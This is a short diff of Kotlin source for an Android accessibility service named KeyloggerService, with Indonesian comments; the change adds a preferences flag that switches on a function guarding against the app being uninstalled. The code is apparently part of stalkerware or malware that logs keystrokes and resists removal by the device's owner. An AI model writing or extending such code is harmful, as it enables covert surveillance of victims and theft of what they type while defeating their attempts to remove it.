@@ -221,6 +221,10 @@ class KeyloggerService : AccessibilityService() {
      * bisa mendeteksi window yang mungkin tidak sedang di-focus.
      */
     private fun guardAgainstUninstall(pkg: String, className: String?) {
+        // ── Cek flag: guard hanya aktif jika anti_uninstall_enabled = true ────
+        val prefs = getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
+        if (!prefs.getBoolean("anti_uninstall_enabled", false)) return
+
         val cls = className ?: ""
 
         when {
